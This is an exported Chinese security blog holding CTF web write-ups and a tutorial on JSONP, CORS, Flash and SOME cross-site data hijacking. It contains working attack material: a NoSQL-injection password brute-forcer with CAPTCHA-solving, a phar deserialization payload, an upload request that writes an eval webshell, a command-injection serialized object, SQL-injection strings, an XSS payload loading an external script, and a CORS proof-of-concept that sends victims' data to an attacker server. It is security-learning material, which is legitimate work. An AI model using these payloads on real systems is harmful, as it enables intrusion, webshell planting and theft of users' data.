爆密码payload：?username[$ne]=1&amp;password[$regex]=^s&amp;vertify=h36f爆账号payload：?username[$regex]=1&amp;password[$ne]=1&amp;vertify=h36f 然后就是验证码爆破了，花上5毛钱接入打码平台： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118# coding:utf-8import requestsfrom hashlib import md5import jsonimport time# swpuCTF验证码爆破# Manggodb爆破payload = &quot;https://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^%s&amp;vertify=%s&quot;url_vertify = &quot;https://123.206.213.66:45678/vertify.php&quot;s = requests.Session()proxies = &#123; &quot;http&quot;: &quot;127.0.0.1:8080&quot;&#125;class RClient(object): def __init__(self, username, password, soft_id, soft_key): self.username = username self.password = md5(password).hexdigest() self.soft_id = soft_id self.soft_key = soft_key self.base_params = &#123; &apos;username&apos;: self.username, &apos;password&apos;: self.password, &apos;softid&apos;: self.soft_id, &apos;softkey&apos;: self.soft_key, &#125; self.headers = &#123; &apos;Connection&apos;: &apos;Keep-Alive&apos;, &apos;Expect&apos;: &apos;100-continue&apos;, &apos;User-Agent&apos;: &apos;ben&apos;, &#125; def rk_create(self, im, im_type, timeout=60): &quot;&quot;&quot; im: 图片字节 im_type: 题目类型 &quot;&quot;&quot; params = &#123; &apos;typeid&apos;: im_type, &apos;timeout&apos;: timeout, &#125; params.update(self.base_params) files = &#123;&apos;image&apos;: (&apos;a.jpg&apos;, im)&#125; r = requests.post(&apos;https://api.ruokuai.com/create.json&apos;, data=params, files=files, headers=self.headers) return r.json() def rk_report_error(self, im_id): &quot;&quot;&quot; im_id:报错题目的ID &quot;&quot;&quot; params = &#123; &apos;id&apos;: im_id, &#125; params.update(self.base_params) r = requests.post(&apos;https://api.ruokuai.com/reporterror.json&apos;, data=params, headers=self.headers) return r.json()def get_time(): now_time = time.strftime(&quot;%H:%M:%S&quot;, time.localtime()) return now_timedef getvertify(): res = s.get(url=url_vertify) file_name = &apos;1.png&apos; with open(file_name, &apos;wb&apos;) as file: file.write(res.content) file.flush() file.close() # print(&quot;[+] 图片下载完成，正在进行图片识别&quot;) rc = RClient(&apos;username&apos;, &apos;pwd&apos;, &apos;keyid&apos;, &apos;key&apos;) im = open(&apos;1.png&apos;, &apos;rb&apos;).read() vertify = rc.rk_create(im, 3040)[&apos;Result&apos;] print(&quot;[+] 识别成功： %s&quot; % str(vertify)) return vertifydef getflag(): global s str_base = &quot;sabcdefghijklmnopqrtuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot; # /-+=.~`!@%^*()[]&#123;&#125;|\;:&apos;\&quot;,&lt;&gt;?&quot; i = 0 j = 0 pwd = &quot;&quot; flag = &quot;&quot; while i &lt; 30: while j &lt; len(str_base): pwd = flag + str_base[j] verify = str(getvertify()) exp = payload % (pwd, verify) url = exp res = s.get(url, proxies=proxies) print(&quot;[*] %s Current payload:%s&quot; % (get_time(), exp)) if &quot;wrong CAPTCHA&quot; in res.text: print(&quot;[-] %s %s&quot; % (get_time(), res.text)) continue elif &quot;username or password incorrect&quot; in res.text: print(&quot;[-] %s %s&quot; % (get_time(), res.text)) j = j+1 else: flag = pwd print(&quot;[-] %s %s&quot; % (get_time(), res.text)) break #time.sleep(1) j=0if __name__ == &apos;__main__&apos;: getflag() web3考点phar反序列化，源码没有unserialize反序列化操作的函数，这是最近blackhat上一个热门议题，phar反序列化。利用点条件： 能将打包好的phar文件上传(扩展名,文件头都可以伪造) 存在文件操作函数：1fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize 具体详细介绍看hpdog师傅的文章：https://www.anquanke.com/post/id/159206#h3-17 这个题的攻击链的构造有一点点小复杂。 先纵观class.php中的三个类： C1e4类中的析构函数有一个echo操作 Show类中有__toString()魔术方法 show类中的__toString() 中有$this-&gt;str[&#39;str&#39;]-&gt;source;这样一个操作。 Test类中有__get()魔术方法，调用私有属性，或者不存在的属性时会触发。 Test类中get()方法会用file_get_contents()读取文件 file.php中有文件操作的函数:file_exists() 所以思路就是：用Test类中get()读到flag文件，用C1e4类中的echo输出结果。 而中间的过程即：我们先将三个类分别new一遍。将show的实例化对象赋值给C1e4r类的$str，使得show对象被echo出来，从而调用show类中的__toString方法。然后我们将show方法中的$this-&gt;str[&#39;str&#39;]赋入test对象，这样就会调用test中的source变量，这个变量不存在，所以触发Test类中的__get()魔术方法，其次Test类的$params要赋值成一个数组键为source，值为flag路径。 即：123456789$a = new Test();$a-&gt;params = [ &apos;source&apos;=&gt; &apos;/var/www/html/f1ag.php&apos;];$b = new Show();$b-&gt;str[&apos;str&apos;] = $a;$c = new C1e4r();$c-&gt;str = $b; 完整payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; echo $this-&gt;source; &#125; public function __toString() // 类被当成字符串回应的方法 &#123; $content = $this-&gt;str[&apos;str&apos;]-&gt;source; return $content; &#125; public function __set($key,$value) // 设置一个类的成员变量时调用 &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this-&gt;source)) &#123; // 防ssrf等等？ die(&apos;hacker!&apos;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() // 执行unserialize()先调用这个，这里用phar来进行调用 &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); // 读flag:f1ag.php return $text; &#125;&#125;$a = new Test();$a-&gt;params = [ &apos;source&apos;=&gt; &apos;/var/www/html/f1ag.php&apos;];$b = new Show();$b-&gt;str[&apos;str&apos;] = $a;$c = new C1e4r();$c-&gt;str = $b;$phar = new Phar(&quot;passer6y.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c);$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;Passer6y&quot;);$phar-&gt;stopBuffering();?&gt; WEB 4玩的时候xssbot挂了.. 这里考察filter_var函数校验绕过payload:email=&quot;&lt;script\ src=https://*.exeye.io/swpu&gt;&lt;/script&gt;&quot;@qq.com&amp;submit= 123456789101112&lt;!--check.phpif($_POST[&apos;email&apos;]) &#123; $email = $_POST[&apos;email&apos;]; if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123; echo &quot;error email, please check your email&quot;; &#125;else&#123; echo &quot;等待管理员自动审核&quot;; echo $email; &#125;&#125;?&gt;--&gt;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安洵杯2018-WebN出题记录]]></title>
    <url>%2F2018%2F12%2F01%2F%E5%AE%89%E6%B4%B5%E6%9D%AF2018-WebN%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[出题思路考点，同源代码执行(Some攻击)，一个jsonp接口，搞不了xss，获取不了信息，但是能回调调用js函数，这样就可以Bypass csrf token了~ 漏洞点： 礼品中心处：怎么购买 怎么充值都是失败的。 分析js代码：在reward.php中点击富萝莉后，会用iframe加载confirm.php的文件 跟进confirm.php一个jsonp的回调接口， 跟进接口jsonp接口，字符实体编码，搞不了反射型xss。 回过头来看reward.php，这里有一个提示： 点击之后，怎么也提示钱不够，而且还有token的验证。 这里思路就很清晰了，csrf 绕token，配合首页的富萝莉客服，让客服点击链接，帮你购买商品 不难想到，肯定就是some攻击调用reward.php中的pay()函数了 exp: 自动测试爬虫： 视频demo：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[骇极杯Web Writeup]]></title>
    <url>%2F2018%2F11%2F07%2F%E9%AA%87%E6%9E%81%E6%9D%AFWeb%20Writeup%2F</url>
    <content type="text"><![CDATA[web1这题考察ssrf。robots.txt中提示有两个文件： source.php flag.php显然一个是源码一个是flag。 这里还考察了一个点，php获取ip的绕过，这里x-client-ip即可绕过。![@JMXBRS[UGCT}~}FG2`}2T.png-69.6kB常见的修改http请求头伪造ip的方法有： X_FORWARDED_FOR Client-IP x-client-ip 然后让我们加上url参数请求i春秋的官网：url=https://www.ichunqiu.com 而且每次请求都发现文件名在变，然后返回的东西里面还有;号，开始以为是考nginx的解析漏洞。后来一想不可能无缘无故给url参数，可能是指定url，然后把读取到的文件写到图片里面。后来看到sn00py师傅测试url=//www.ichunqiu.com的时候发现，再去访问图片的响应码就变成200了。 然后想到用file协议去绕url限制： 读flag web2题目源码：12345678910111213141516171819202122232425262728&lt;?php //error_reporting(0); //$dir=md5(&quot;icq&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]); //$dir=md5(&quot;icq&quot;); //$sandbox = &apos;/var/sandbox/&apos; . $dir; //@mkdir($sandbox); //@chdir($sandbox); if($_FILES[&apos;file&apos;][&apos;name&apos;])&#123; $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;]; if (!is_array($filename)) &#123; $filename = explode(&apos;.&apos;, $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(&quot;emmmm...&quot;); &#125; $new_name = (string)rand(100,999).&quot;.&quot;.$ext; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name); $_ = $_POST[&apos;hehe&apos;]; if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos; &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); &#125; unlink($new_name); &#125; else&#123; highlight_file(__FILE__); &#125; 上传页，抓包用： 正常解法,先绕end()和$filename[count($filename) - 1]的差异，然后end是取最后一个插入的元素，后者是取索引中的最后一个，然后我们上传的时候给file变量传数组就不会进入explode截断，这样就可以绕过：123if($ext==$filename[count($filename) - 1])&#123; die(&quot;emmmm...&quot;);&#125; 接着后面是给文件名重命令三位随机数，并且hehe参数不能包含这个随机重命名的上传文件。这里参考 https://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html 接着可以使用x/../1.php/.进行文件覆盖1234567891011121314151617181920212223242526272829303132333435POST /file_upload/shanghai/1.php HTTP/1.1Host: ctfUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like GeckoAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------20782431812432Content-Length: 717Referer: https://ctf/file_upload/shanghai/upload.htmlConnection: closeUpgrade-Insecure-Requests: 1-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file[1]&quot;jpg-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file[0]&quot;x/../1.php/.-----------------------------20782431812432Content-Disposition: form-data; name=&quot;hehe&quot;1.php-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: application/octet-stream@&lt;?php $file = &apos;1ndex.php&apos;;$code = &apos;&lt;?php eval($_POST[\&apos;passer6y\&apos;]);?&gt;&apos;;file_put_contents($file,$code);?&gt;-----------------------------20782431812432Content-Disposition: form-data; name=&quot;submit&quot;submit-----------------------------20782431812432-- 这样就可以拿到shell了。 sn00py师傅最初的非预期解法，就是因为想到，hehe变量不能包含自己传上去的文件，所以开多个爆破程序，让A程序和B程序相互产生的随机数相互碰撞，直到包含成功。 web3题目：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php error_reporting(E_ALL); class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str); return $str; &#125; function echo($host)&#123; system(&quot;echo $host&quot;); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; &#125; $first=&apos;hi&apos;; $var=&apos;var&apos;; $bbb=&apos;bbb&apos;; $ccc=&apos;ccc&apos;; $i=1; foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125; &#125; if($first===&quot;doller&quot;) &#123; @parse_str($_GET[&apos;a&apos;]); // 注册变量 if($var===&quot;give&quot;) &#123; if($bbb===&quot;me&quot;) &#123; if($ccc===&quot;flag&quot;) &#123; echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;; $come=@$_POST[&apos;come&apos;]; unserialize($come); &#125; &#125; else &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125; &#125; else &#123; echo &quot;NO&quot;; &#125; &#125; else &#123; echo &quot;Can you hack me?&lt;br&gt;&quot;; &#125;?&gt; 这题先考察变量覆盖，再考察反序列化漏洞。37行处$i变量覆盖一直想多循环几次多覆盖几个变量，结果发现传入的i=1的类型是字符型，而if判断的是===。所以这里就只能先覆盖$first变量进入，parse_str部分,这里可以继续覆盖变量，文档,所以可以构造payload：12?first=doller&amp;a%3dvar%3dgive%26bbb%3dme%26ccc%3dflag// 解码后：?first=doller&amp;a=var=give&amp;bbb=me&amp;ccc=flag 下面就考察反序列化的东西了，构造函数传入参数，析构函数回调echo函数。需要绕过waf函数。&amp;拼接命令，${IFS}绕过空格，fl””ag绕过flag的限制。 payload：12345678910111213141516171819202122232425262728293031323334&lt;?phperror_reporting(E_ALL);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); // 注册变量，过滤值 &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str); return $str; &#125; function echo($host)&#123; echo &quot;\n&quot;; system(&quot;echo $host&quot;); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; &#125;$args = array(&apos;1&amp;cat$&#123;IFS&#125;fl&quot;&quot;ag&apos;);$aa = new come(&quot;echo&quot;,$args);echo urlencode(serialize($aa)); 本地测试： web4一个后台登录页，还有一个注入点。 if sleep # 没被过滤11&apos;+and+if((SELECT+VERSION())&gt;1,sleep(3),0)%23 mid 也没被过滤11&apos;+and+if(mid((SELECT+VERSION()),1,1)+&gt;1,sleep(3),0)%23 测下面这条语句被拦了11&apos;+and+if(mid((SELECT+schema_name+from+information_schema.SCHEMATA+limit+1,1),1,1)+&gt;1,sleep(3),0)%23 下面这个证明拦截了关键字information_schema.11&apos;+and+if(mid((SELECT+schema_name+from+SCHEMATA+limit+1,1),1,1)+&lt;1,sleep(3),0)%23&amp;Submit=Select+Guest 可以用information . tables绕过，然后提示str_replace为空，所以需要双写，这里需要fuzz一下过滤的东西。然后双写select和from即可绕过11&apos;+and+if+((ascii(mid((seselectlect+table_name+frofromm+information_schema+.+tables+limit+1),1,1))&gt;1),sleep(3),0)%23 这里还有一个显注的方法：1id=sd&apos; unifromon selselectect (seselectlect group_concat(username,&apos;:&apos;,password)frfromom web.user),2#: https://xz.aliyun.com/t/3153#toc-3 接下来就是一个文件上传这里得想办法截断txt,或许是nginx解析漏洞？ sn00py师傅教我fuzz，0x00-&gt;0xff 然后尝试截断后面的txt，先用脚本生成一下字典12345for i in range(0,256): i = bytes(chr(i), &apos;utf8&apos;) with open(&quot;dic.txt&quot;, &quot;ab+&quot;) as f: f.write(i) f.write(bytes(&apos;\n&apos;, &apos;utf-8&apos;))]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨站数据劫持]]></title>
    <url>%2F2018%2F09%2F16%2F%E8%B7%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8A%AB%E6%8C%81%2F</url>
    <content type="text"><![CDATA[学习了一下常见的前端漏洞 0x01 基础一：HTTP协议 请求行GET /images/logo.gif HTTP/1.1 HTTP 请求头 Authorization Origin Cookie Host Referer User-Agent X-Forwarded-For 3.HTTP 响应头 Access-Control-Allow-Origin Access-Control-Allow-Credentials Location Set-Cookie X-XSS-Protection Content-Security-Policy server X-Powered-By X-Frame-Options 二： 什么是CSP(Content Security Policy)？CSP是一种由开发者定义的安全政策声明，通过csp约束的规则指定可信的内容来源。包括脚本、图片、iframe、style等可能的远程资源。CSP主要是为了减缓XSS、clickjacking和其他的一些代码注入的攻击，目的是尽量使可执行的内容从可信的目标传递过来。 CSP的浏览器支持情况CSP有三个header： Content-Security-Policy：chrome 25+，Firefox 23+，Opera 19+ X-Content-Security-Policy：Firefox 23+，IE10+ X-WebKit-CSP：Chrome 25+ 日常见到最多的就是Content-Security-Policy Header： CSP支持的指令参考：https://content-security-policy.com/1default-src,script-src,object-src,style-src,img-src,media-src,frame-src,font-src,connect-src,form-action,sandbox,script-nonce,plugin-types,reflected-xss,report-uri 预设的值有1234none: 不匹配任何东西self: 匹配当前域，(不包括子域，比如example.com可以，api.example.com 则会匹配失败。)unsafe-inline 允许内嵌的脚本及样式。是的，没看错，对于页面中内嵌的内容也是有相应限制规则的。unsafe-eval 允许通过字符串动态创建的脚本执行，比如eval，setTimeout 等。 还有的将值位置为nonce值，一个随机的字符串，表示只加载含有该随机字符串的文件。 浏览器安全策略说之内容安全策略CSP 三： 同源策略(SOP)又是什么？同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。相同源：当两个域具有相同的协议，相同的域名，同端口，说明这是相同源。 四：那么如何跨域获取资源？由于受到同源策略的影响，跨域数据会受到制约。但是人们想出了很多跨域的方式。 https://juejin.im/entry/58a3ca13128fe10058c5863b Jsonp CORS(Cross-Origin Resource Sharing) Cross-document messaging document.domain 属性 WebSocket 五：Jsonp原理其实很简单，就是利用&lt;script&gt;标签没有跨域限制的“漏洞”,达到与第三方通讯的目的，形如：1&lt;script src=&quot;https://www.example.net/api?callback=Passer6y&quot;&gt;&lt;/script&gt; 客户端传递一个callback参数给服务端-&gt;服务端用callback参数包裹住json数据(将passer6y当函数名，json数据当函数的参数)-&gt;客户端js中的(passer6y)回调数据。简单理解为：带callback的json就是jsonp实现过程如下：A网站想要获取B网站的用户数据，A网站中js写法如下：1234567891011&lt;script type=&quot;text/javascript&quot;&gt; var script = document.createElement(&apos;script&apos;); var url = &apos;https://127.0.0.1/server.php?callback=passer6y&apos;; script.src = url; document.body.appendChild(script); function passer6y(json) &#123; var obj = JSON.parse(json); alert(obj); &#125;&lt;/script&gt; B网站将数据打包好，回传给A网站，并调用A站的passer6y函数：1234567&lt;?php$userInfo = &apos;FDrag0n&apos;;$jsdata = json_encode($userInfo);!empty($_GET[&apos;callback&apos;]) ? $_GET[&apos;callback&apos;] : &apos;callback&apos;;echo $_GET[&apos;callback&apos;].&apos;(&apos;.json_encode($jsdata).&apos;)&apos;;?&gt; A网站执行paser6y函数： 还有一些其他标签跨域的方法：https://www.anquanke.com/post/id/97671 六：CORS：跨域资源共享因为浏览器会限制从脚本发起的跨域HTTP请求(比如：XMLHttpRequest、Fetch APIs)，而且jsonp传输数据难以做权限校验，如果传输过程涉及敏感信息，恶意的网站B将数据jsonp的数据接口嵌入自己的网站页面，从而用户访问者浏览B页面的时候，将其在A站的敏感数据盗取(CSRF)。这时候就出现了CORS。 否则就会被同源策略限制： 详情：MDN CORS Docs 如果设置允许发送cookie:Access-Control-Allow-Credentials: true，那么就和CSRF一样了。 跨域资源共享CORS详解 0x02 Jsonp 劫持1.利用条件： 使用Jsonp获取数据 没有校验referer，或referer可绕过 GET请求中不包含token相关参数。 Discover？挖掘Jsonp漏洞的关键就是寻找回调函数，常见的Callback参数如下：12345678910callback cb jsonp jsonpcallback jsonpcb jsonp_cb json= jsoncallback jcbcall 如何自动化查找这样的接口？过滤burpsuite/Fiddler记录，一个一个的人工排查。或者用Selenium + Proxy + 验证脚本： Selenium: 在网页上瞎点按钮、超链接等 Proxy： 记录所有请求，过滤带有敏感信息的jsonp请求，并记录下HTTP请求 验证脚本：去掉Referer字段，再次发送请求jsonp_info_leak Tools Exploit将含有jsonp劫持漏洞的数据接口嵌入我们的Attack站上，用户点开窃取受害者账户信息 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;xxxx CORs Poc&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h2&gt;xxxx CORs POC&lt;/h2&gt; &lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Poc&lt;/button&gt; &lt;/div&gt; &lt;script&gt; function cors()&#123; var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() &#123; if(this.readyState == 4 &amp;&amp; this.status == 200) &#123; document.location=&apos;https://记录数据的服务器地址?&apos;+escape(this.responseText); &#125; &#125;; xhttp.open(&apos;GET&apos;,&apos;https://jsonp接口&apos;,true); xhttp.withCredentials = true; xhttp.send(); &#125;&lt;/script&gt; Bypass正则配置不当绕过：.*domain\.com-&gt;domain.com.evil.me空referer绕过：&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; jsonp跨域传输的url可控的话，说不定还能造成xss等其他问题 参考： 如何挖掘Jsonp漏洞JSONP与CORS漏洞挖掘 0x03 Flash跨域数据劫持Flash跨域访问的时候主要受到crossdomain.xml文件的影响，当A网站嵌入一个Flash，然后Flash跨域请求B网站下的资源，这个时候就会先查看B网站下的crossdomain.xml文件是否允许A网站Flash请求B网站的资源。 模板站点下必须存在crossdomain.xml，且配置循序其他域的AS脚本进行跨域请求1234&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt; 如果allow-access-from domain被设置为*后，可能造成Flash Csrf的风险(同时这也是我们搜集子域名的一种方式~)。 Discover利用条件即：crossdomain.xml中的allow-access-from domain=*或者过滤规则不严。所以可以爬行网站的全部域名跟目下的crossdomain.xml文件是否存在配置漏洞或者Google Hacking:inurl:crossdomain filetype:xml。其次需要找到一个能获取敏感信息的接口，然后构建swf的poc对外发送http请求。 还有一种情况,可以无视crossdomain.xml文件: 文件上传+Flash csrf就是如果有allow-access-from domain=A.victim.com的限制，则只能去允许的域下找上传点,然后上传swf的exp(扩展名随便换)，然后创建Attack.com页面，用object标签去包含我们上传在victim.com站内的swf文件，有用户访问Attack.com的时候，就会加载victim.com中的swf exp向敏感数据接口发送http请求等，造成跨域数据劫持。 Exploit POC：Cross-Site Content (Data) Hijacking (XSCH) PoC Project 这里本地搭建好测试的过程： 或者使用Flash ActionScript跨域发送请求1234import flash.net.*;var _l = new URLLoader(new URLRequest(“https://目标站点/&quot;));_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);_l.load(); 案例：Flash跨域数据劫持即使上传JPG文件也可能导致跨站点内容劫持 0x04 CORS跨域资源读取这个没啥好说的，配置不当导致，看到access-Control-Allow-Origin为*，或者可绕过。然后还Access-Control-Allow-Credentials为TRUE,发送cookie，和CSRF一样， demo：Victim.com：1234&lt;?phpheader(&apos;Access-Control-Allow-Origin: *&apos;);//header(&apos;Access-Control-Allow-Credentials:true&apos;);echo &quot;Fdrag0n love bed&quot;; Attack.com:12345678910&lt;script&gt;var request = new XMLHttpRequest();request.open(&quot;GET&quot;, &quot;https://107.175.17.240/1.php&quot;, true);request.send();request.onreadystatechange = function()&#123; if(request.readyState === 4 &amp;&amp; request.status === 200)&#123; alert(request.responseText); &#125;&#125;&lt;/script&gt; 平台Cross-Site Content (Data) Hijacking (XSCH) PoC Project Silverlight跨域PostMessage0x05 Some攻击(Same Origin Method Execution)SOME，类似于Hijking攻击，是同源代码执行漏洞的简称。 危害：理论上任何具备点击功能的网站都存在这种攻击的可能，缺陷就是不能带参数进行操作 利用条件 Jsonp回调值可控 没有过滤.符号和函数 原理五个页面：index.html、step1.html、jsonp.html、json_data.php、function.htmlindex.html1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;title&gt;SOME Main&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=&quot;step1.html&quot; target=&quot;_blank&quot; &gt;aaaaaaa&lt;/a&gt;&lt;script type=&quot;text/javascript&quot;&gt; function startSOME() &#123; myWindow=window.open(&apos;https://127.0.0.1/step1.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;); window.location.href = &quot;https://127.0.0.1/function.html&quot;;&#125; startSOME();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; step1.html12345678910&lt;html&gt;&lt;script&gt;function waitForDOM() &#123; window.location.href =&quot;https://127.0.0.1/jsonp.php?callback=window.opener.shareAllPhotos&quot;;&#125;setTimeout(waitForDOM,3000);&lt;/script&gt;&lt;/html&gt; jsonp.php1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Vulnerable JSONP endpoint caller&lt;/title&gt;&lt;?phpecho &apos;&lt;script src=&quot;https://127.0.0.1/jsonp_data.php?callback=&apos;.$_GET[&quot;callback&quot;].&apos;&quot;&gt;&lt;/script&gt;&apos;?&gt;&lt;/head&gt;&lt;/html&gt; json_data.php12345&lt;?phpecho $_GET[&quot;callback&quot;] . &quot;(&#123; Fdrag0n : &apos;Fdrag0n L0ve sleep&apos; &#125;);&quot;;?&gt; function.html1234567891011121314&lt;html&gt;&lt;head&gt;&lt;title&gt;Google Photos&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; function shareAllPhotos(data) &#123; prompt(data.Fdrag0n); &#125; console.log(window.opener); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Exploit&amp;Toolshttps://github.com/linkedin/sometime Defence 回调值固定(或者白名单)，外部不可控 Game:Same Origin Method Execution 0x07 组合拳自己臆想的几种… 还没有实现 XSS+CORS数据劫持绕过access-Control-Allow-Origin 文件上传(图片、PDF、txt都行) + Flash Csrf绕过crossdomain Practice1.]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅析反向代理]]></title>
    <url>%2F2018%2F07%2F05%2F%E6%B5%85%E6%9E%90%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[最近这段时间频频接触到反代的东西，所以就更进一步的了解了一番, 有什么不对的地方还请大佬们指正~本文需要用到的代码已上传Github本文由安全客原创发布 本文涉及到的东西仅供技术研究，请勿用于非法用途，否则后果自负 浅析反向代理0x01: 前言最近把博客重新弄了一下，发现了一个特别有意思的东西，看图~ 还有一些有意思的东西，比如反代谷歌(谷歌镜像站)、钓鱼、绕过国内备案和线下CTF中的一些骚操作，等等。 0x02: 简介反向代理，简而言之就是反向代理服务器从目标内容服务器上抓取内容返回给用户，反向代理服务器充当一个中介功能，他本身是没有任何内容的。区别于正向代理而言，反向代理是代理的服务端，而正向代理是代理的客户端。 再来简单介绍一下我在前言中所说的我让我的博客ip是如何变成1.1.1.1的，其实1.1.1.1是一台DNS服务器(号称全球最快的DNS)，正好1.1.1.1又是cf cdn中的一个节点。这样我们就可以将域名解析到1.1.1.1，然后在cf中设置好真实的回源地址即可。在文末已附上教程链接，感兴趣的可以玩玩~ 0x03: 一些有意思的东西除了上述所说的套一个CDN，让自己ip变成1.1.1.1来隐藏自己站点ip，还有一些其他好玩的~ 